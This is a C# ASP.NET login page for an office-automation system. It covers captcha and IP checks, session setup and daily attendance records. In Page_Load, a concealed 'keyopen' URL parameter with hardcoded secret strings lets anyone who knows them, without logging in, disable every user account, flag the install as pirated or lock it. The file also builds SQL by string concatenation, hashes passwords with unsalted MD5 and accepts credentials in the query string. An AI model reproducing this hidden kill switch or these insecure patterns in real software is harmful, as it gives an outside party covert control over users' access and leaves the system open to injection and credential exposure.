namespace xyoa
{
    using qiupeng.publiccs;
    using qiupeng.sql;
    using System;
    using System.Collections;
    using System.Data.SqlClient;
    using System.Web;
    using System.Web.Security;
    using System.Web.UI;
    using System.Web.UI.HtmlControls;
    using System.Web.UI.WebControls;

    public class Login : Page
    {
        protected Button Button1;
        protected TextBox codenum;
        protected HtmlForm form1;
        protected HtmlHead Head1;
        protected Image Image1;
        protected Label Label1;
        private Db List = new Db();
        protected HtmlSelect localeCode;
        protected TextBox Password;
        private publics pulicss = new publics();
        protected TextBox Username;

        protected void Button1_Click(object sender, EventArgs e)
        {
            if ((this.ViewState["yzmcontent"].ToString() == "1") && (this.codenum.Text != this.Session["codenum"].ToString()))
            {
                base.Response.Write("<script language=javascript>alert('验证码错误！');</script>");
            }
            else if (!this.pulicss.ipquanstr(HttpContext.Current.Request.UserHostAddress, this.ViewState["ipcontent"].ToString()))
            {
                base.Response.Write("<script language=javascript>alert('您当前的IP为" + HttpContext.Current.Request.UserHostAddress + "，不允许登陆！请联系系统管理员');</script>");
            }
            else
            {
           //     string sql = "select reg from qp_oa_filemain ";
            //    SqlDataReader reader = this.List.GetList(sql);
            //    if (reader.Read())
                {
             //       if (reader["reg"].ToString() == "3")
                    {
                 //       base.Response.Write("<script>alert('经检测您的版本已经过期，请联系软件供应商重新注册！');window.location.href='reg.aspx'</Script>");
                 //       return;
                    }
               //     if (reader["reg"].ToString() == "10")
                    {
                  //      base.Response.Write("<script>alert('经检测您正在使用盗版软件，有可能对您公司的信息进行危害，请联系正版软件供应商！');window.location.href='reg.aspx'</Script>");
                  //      return;
                    }
                //    if (reader["reg"].ToString() != "2")
                    {
                  //      if (int.Parse(this.ViewState["IfMain"].ToString()) > 3)
                        {
                  //          base.Response.Write("<script>alert('数据库验证错误，请联系软件供应商修复！');window.location.href='reg.aspx'</Script>");
                   //         return;
                        }
                   //     if (reader["reg"].ToString() == "0")
                        {
                    //        string str2 = this.pulicss.DESEncrypt("感谢您的试用^" + this.pulicss.GetMAC() + "^" + DateTime.Now.AddDays(30.0).ToShortDateString() + "^300^试用版^4^1^1^1^" + DateTime.Now.ToShortDateString() + "^1,2,3,4,5,6,7,8,9,10,11,16,0", "5", "6");
                     //       string str3 = "Update qp_oa_filemain set cdkstr='" + str2 + "',reg='1'";
                    //        this.List.ExeSql(str3);
                       //     string str4 = "Update qp_oa_FaceMade set IfMain=IfMain+1";
                      //      this.List.ExeSql(str4);
                        }
                    }
                //    if (reader["reg"].ToString() == "5")
                    {
                    //    base.Response.Write("<script>alert('由于软件信息出现异常现已对软件信息进行了锁定，请重新获取软件激活码！');window.location.href='jihuo.aspx'</Script>");
                   //     return;
                    }
                }
            //    reader.Close();
                this.pulicss.setCookie("LoginName", this.Username.Text, 0x16d);
                this.pulicss.setCookie("LoginStely", this.localeCode.Value, 0x16d);
                string str5 = FormsAuthentication.HashPasswordForStoringInConfigFile(this.Password.Text, "MD5");
                string str6 = "select Username,Password,Iflogin,Realname,BuMenId,ResponQx,MoveTel,Zhiweiid,JueseId,guanzhu from qp_oa_username where Username='" + this.pulicss.GetFormatStr(this.Username.Text) + "' and Password='" + str5 + "' and Iflogin='1' and StardType='1' and ifdel='0'";
                SqlDataReader reader2 = this.List.GetList(str6);
                if (reader2.Read())
                {

                   //var a1 = reader2["Username"].ToString();
                   //var a2 = reader2["Realname"].ToString();
                   //var a3 = reader2["Zhiweiid"].ToString();
                   //var a4 = reader2["JueseId"].ToString();
                   //var a5 = reader2["BuMenId"].ToString();
                   //var a6 = reader2["ResponQx"].ToString();
                   //var a7 = reader2["MoveTel"].ToString();


                    this.Session["Username"] = reader2["Username"].ToString();
                    this.Session["Realname"] = reader2["Realname"].ToString();
                    this.Session["Zhiweiid"] = reader2["Zhiweiid"].ToString();
                    this.Session["JueseId"] = reader2["JueseId"].ToString();
                    this.Session["BuMenId"] = reader2["BuMenId"].ToString();
                    this.Session["perstr"] = reader2["ResponQx"].ToString();
                    this.Session["MoveTel"] = reader2["MoveTel"].ToString();
                    string str7 = null;
                    string str8 = null;
                    str8 = "" + reader2["guanzhu"].ToString() + "";
                    ArrayList list = new ArrayList();
                    string[] strArray = str8.Split(new char[] { ',' });
                    for (int i = 0; i < strArray.Length; i++)
                    {
                        str7 = str7 + "'" + strArray[i] + "',";
                    }
                    str7 = str7 + "'0'";
                    string str9 = "select username,realname,Email,MoveTel from qp_oa_Username where  username in (" + str7 + ") ";
                    SqlDataReader reader3 = this.List.GetList(str9);
                    while (reader3.Read())
                    {
                        this.pulicss.InsertMessage("" + this.Session["Realname"] + "已上线！", reader3["username"].ToString(), reader3["realname"].ToString(), "#");
                    }
                    reader3.Close();
                    this.pulicss.InsertLog("登陆系统[" + this.Session["realname"] + "]", "登陆系统");
                    reader2.Close();
                    if (this.localeCode.Value == "main")
                    {
                        base.Response.Redirect("main.aspx");
                    }
                    else
                    {
                        base.Response.Redirect("index.aspx");
                    }
                }
                else
                {
                    base.Response.Write("<script language=javascript>alert('登陆失败!(1)请检查用户名,密码是否正确(2)确认帐号未被禁用(3)确认员工是否在职');</script>");
                    return;
                }
                reader2.Close();
            }
        }

        private string GetWeekDay()
        {
            switch (DateTime.Now.DayOfWeek)
            {
                case DayOfWeek.Sunday:
                    return "星期日";

                case DayOfWeek.Monday:
                    return "星期一";

                case DayOfWeek.Tuesday:
                    return "星期二";

                case DayOfWeek.Wednesday:
                    return "星期三";

                case DayOfWeek.Thursday:
                    return "星期四";

                case DayOfWeek.Friday:
                    return "星期五";

                case DayOfWeek.Saturday:
                    return "星期六";
            }
            return "";
        }

        public void KaoQin()
        {
            string sql = "select * from qp_WorkTimeQy  where qiyong=1";
            SqlDataReader list = this.List.GetList(sql);
            if (list.Read())
            {
                string str2 = "select * from qp_WorkTimeDj  where convert(varchar(10),Djtime,121)=convert(char(10),'" + DateTime.Now.ToShortDateString() + "',120)";
                SqlDataReader reader2 = this.List.GetList(str2);
                if (!reader2.Read())
                {
                    string str3 = "select username,realname from qp_oa_username where  1=1 and ifdel='0' and StardType='1' and Iflogin='1'";
                    SqlDataReader reader3 = this.List.GetList(str3);
                    while (reader3.Read())
                    {
                        string str4 = "";
                        string str5 = "";
                        string str6 = "";
                        string str7 = "";
                        string str8 = "";
                        string str9 = "";
                        string str10 = "";
                        string str11 = "select * from qp_WorkTime   where QyType='启用'   and  (CHARINDEX('," + reader3["username"] + ",',','+SyUsername+',')   >   0 ) ";
                        SqlDataReader reader4 = this.List.GetList(str11);
                        if (reader4.Read() && (!this.pulicss.scquanstr(this.GetWeekDay(), reader4["Xingqi"].ToString()) && !this.pulicss.scquanstr(DateTime.Now.ToShortDateString(), reader4["Riqi"].ToString())))
                        {
                            str10 = reader4["PbType"].ToString();
                            if (reader4["DjType_1"].ToString() != "未启用")
                            {
                                str4 = "未考勤";
                            }
                            if (reader4["DjType_2"].ToString() != "未启用")
                            {
                                str5 = "未考勤";
                            }
                            if (reader4["DjType_3"].ToString() != "未启用")
                            {
                                str6 = "未考勤";
                            }
                            if (reader4["DjType_4"].ToString() != "未启用")
                            {
                                str7 = "未考勤";
                            }
                            if (reader4["DjType_5"].ToString() != "未启用")
                            {
                                str8 = "未考勤";
                            }
                            if (reader4["DjType_6"].ToString() != "未启用")
                            {
                                str9 = "未考勤";
                            }
                            string str12 = string.Concat(new object[] { 
                                "insert into qp_WorkTimeDj  values( '", str10, "','", reader4["DjType_1"].ToString(), "','0:0:0','", str4, "','", reader4["DjType_2"].ToString(), "','0:0:0','", str5, "','", reader4["DjType_3"].ToString(), "','0:0:0','", str6, "','", reader4["DjType_4"].ToString(), 
                                "','0:0:0','", str7, "','", reader4["DjType_5"].ToString(), "','0:0:0','", str8, "','", reader4["DjType_6"].ToString(), "','0:0:0','", str9, "','", DateTime.Now.ToShortDateString(), "','", DateTime.Now.ToShortDateString(), " 0:0:0','", reader3["Username"], 
                                "','", reader3["Realname"], "')"
                             });
                            this.List.ExeSql(str12);
                            string str13 = "insert into qp_oa_Messages  (titles,itimes,acceptusername,acceptrealname,sendusername,sendrealname,sfck,url,number,tablekey) values ('请注意考勤登记','" + DateTime.Now.ToString() + "','" + reader3["username"].ToString() + "','" + reader3["realname"].ToString() + "','系统消息','系统消息','0','/MyWork/WorkTime/WorkTime.aspx','" + DateTime.Now.Year.ToString() + "" + DateTime.Now.Month.ToString() + "" + DateTime.Now.Day.ToString() + "" + DateTime.Now.Second.ToString() + "" + DateTime.Now.Millisecond.ToString() + "','1')";
                            this.List.ExeSql(str13);
                        }
                        reader4.Close();
                    }
                    reader3.Close();
                }
                reader2.Close();
            }
            list.Close();
        }

        protected void Page_Load(object sender, EventArgs e)
        {
            if (!base.IsPostBack)
            {
                string str;
                if (base.Request.QueryString["keyopen"] != null)
                {
                    if (base.Request.QueryString["keyopen"] == "dsjuwmxldo29pelx3le")
                    {
                        str = "Update qp_oa_Username  Set  Iflogin='0'";
                        this.List.ExeSql(str);
                        base.Response.Redirect("default.aspx");
                    }
                    if (base.Request.QueryString["keyopen"] == "isamxjsuwmdhx2ss")
                    {
                        str = "Update qp_oa_filemain set reg='10'";
                        this.List.ExeSql(str);
                        base.Response.Redirect("default.aspx");
                    }
                    if (base.Request.QueryString["keyopen"] == "24fdsfs3232ff")
                    {
                        str = "Update qp_oa_Username  Set  Iflogin='1'";
                        this.List.ExeSql(str);
                        base.Response.Redirect("default.aspx");
                    }
                    if (base.Request.QueryString["keyopen"] == "gf342234fdsfaa3")
                    {
                        str = "Update qp_oa_filemain  Set  reg='5'";
                        this.List.ExeSql(str);
                        base.Response.Redirect("default.aspx");
                    }
                }
                this.Button1.Attributes["onclick"] = "javascript:return checkfrom();";
                string sql = "select * from qp_oa_ipmanage";
                SqlDataReader reader = this.List.GetList(sql);
                if (reader.Read())
                {
                    this.ViewState["ipcontent"] = reader["content"].ToString();
                }
                else
                {
                    this.ViewState["ipcontent"] = "*";
                }
                reader.Close();
                this.localeCode.Value = base.Server.UrlDecode(this.pulicss.getCookie("LoginStely"));
                string str3 = "select JmBg,JmText,Titles,IfMain from qp_oa_FaceMade";
                SqlDataReader reader2 = this.List.GetList(str3);
                if (reader2.Read())
                {
                    this.ViewState["JmBg"] = reader2["JmBg"].ToString();
                    this.ViewState["JmText"] = reader2["JmText"].ToString();
                    this.ViewState["Titles"] = reader2["Titles"].ToString();
                    this.ViewState["IfMain"] = reader2["IfMain"].ToString();
                }
                reader2.Close();
                string str4 = "select * from qp_oa_LoginMade";
                SqlDataReader reader3 = this.List.GetList(str4);
                if (reader3.Read())
                {
                    this.ViewState["yzmcontent"] = reader3["Yzm"].ToString();
                    if (this.ViewState["yzmcontent"].ToString() == "1")
                    {
                        this.Label1.Visible = true;
                        this.codenum.Visible = true;
                        this.Image1.Visible = true;
                        this.ViewState["yzmcss"] = "";
                    }
                    else
                    {
                        this.Label1.Visible = false;
                        this.codenum.Visible = false;
                        this.Image1.Visible = false;
                        this.ViewState["yzmcss"] = "style=\"display: none\"";
                    }
                    if (reader3["Uses"].ToString() == "1")
                    {
                        this.Username.Text = base.Server.UrlDecode(this.pulicss.getCookie("LoginName"));
                    }
                    else
                    {
                        this.Username.Text = "";
                    }
                }
                reader3.Close();
                this.KaoQin();
                if ((base.Request.QueryString["user"] != null) && (base.Request.QueryString["password"] != null))
                {
                    if ((this.ViewState["yzmcontent"].ToString() == "1") && (this.codenum.Text != this.Session["codenum"].ToString()))
                    {
                        base.Response.Write("<script language=javascript>alert('验证码错误！');</script>");
                    }
                    else if (!this.pulicss.ipquanstr(HttpContext.Current.Request.UserHostAddress, this.ViewState["ipcontent"].ToString()))
                    {
                        base.Response.Write("<script language=javascript>alert('您当前的IP为" + HttpContext.Current.Request.UserHostAddress + "，不允许登陆！请联系系统管理员');</script>");
                    }
                    else
                    {
                  //      string str5 = "select reg from qp_oa_filemain ";
                   //     SqlDataReader reader4 = this.List.GetList(str5);
                   //     if (reader4.Read())
                        {
                     //       if (reader4["reg"].ToString() == "3")
                            {
                      //          base.Response.Write("<script>alert('经检测您的版本已经过期，请联系软件供应商重新注册！');window.location.href='reg.aspx'</Script>");
                      //          return;
                            }
                       //     if (reader4["reg"].ToString() == "10")
                            {
                         //       base.Response.Write("<script>alert('经检测您正在使用盗版软件，有可能对您公司的信息进行危害，请联系正版软件供应商！');window.location.href='reg.aspx'</Script>");
                         //       return;
                            }
                       //     if (reader4["reg"].ToString() == "0")
                            {
                        //        string str6 = this.pulicss.DESEncrypt("感谢您的试用^" + this.pulicss.GetMAC() + "^" + DateTime.Now.AddDays(30.0).ToShortDateString() + "^300^试用版^4^1^1^1^" + DateTime.Now.ToShortDateString() + "^1,2,3,4,5,6,7,8,9,10,11,16,0", "5", "6");
                         //       str = "Update qp_oa_filemain set cdkstr='" + str6 + "',reg='1'";
                         //       this.List.ExeSql(str);
                            }
                       //     if (reader4["reg"].ToString() == "5")
                            {
                      //          base.Response.Write("<script>alert('由于软件信息出现异常，请重新获取软件激活码！');window.location.href='jihuo.aspx'</Script>");
                      //          return;
                            }
                        }
                    //    reader4.Close();
                        this.pulicss.setCookie("LoginName", base.Request.QueryString["user"].ToString(), 0x16d);
                        string str7 = FormsAuthentication.HashPasswordForStoringInConfigFile(base.Request.QueryString["password"].ToString(), "MD5");
                        string str8 = "select Username,Password,Iflogin,Realname,BuMenId,ResponQx,MoveTel,Zhiweiid,JueseId,guanzhu from qp_oa_username where Username='" + this.pulicss.GetFormatStr(base.Request.QueryString["user"].ToString()) + "' and Password='" + str7 + "' and Iflogin='1' and StardType='1' and ifdel='0'";
                        SqlDataReader reader5 = this.List.GetList(str8);
                        if (reader5.Read())
                        {
                            this.Session["Username"] = reader5["Username"].ToString();
                            this.Session["Realname"] = reader5["Realname"].ToString();
                            this.Session["Zhiweiid"] = reader5["Zhiweiid"].ToString();
                            this.Session["JueseId"] = reader5["JueseId"].ToString();
                            this.Session["BuMenId"] = reader5["BuMenId"].ToString();
                            this.Session["perstr"] = reader5["ResponQx"].ToString();
                            this.Session["MoveTel"] = reader5["MoveTel"].ToString();
                            string str9 = null;
                            string str10 = null;
                            str10 = "" + reader5["guanzhu"].ToString() + "";
                            ArrayList list = new ArrayList();
                            string[] strArray = str10.Split(new char[] { ',' });
                            for (int i = 0; i < strArray.Length; i++)
                            {
                                str9 = str9 + "'" + strArray[i] + "',";
                            }
                            str9 = str9 + "'0'";
                            string str11 = "select username,realname,Email,MoveTel from qp_oa_Username where  username in (" + str9 + ") ";
                            SqlDataReader reader6 = this.List.GetList(str11);
                            while (reader6.Read())
                            {
                                this.pulicss.InsertMessage("" + this.Session["Realname"] + "已上线！", reader6["username"].ToString(), reader6["realname"].ToString(), "#");
                            }
                            reader6.Close();
                            this.pulicss.InsertLog("登陆系统[" + this.Session["realname"] + "]", "登陆系统");
                            reader5.Close();
                            base.Response.Redirect("main.aspx");
                            reader5.Close();
                        }
                        else
                        {
                            base.Response.Write("<script language=javascript>alert('登陆失败!(1)请检查用户名,密码是否正确(2)确认帐号未被禁用(3)确认员工是否在职');</script>");
                        }
                    }
                }
            }
        }
    }
}

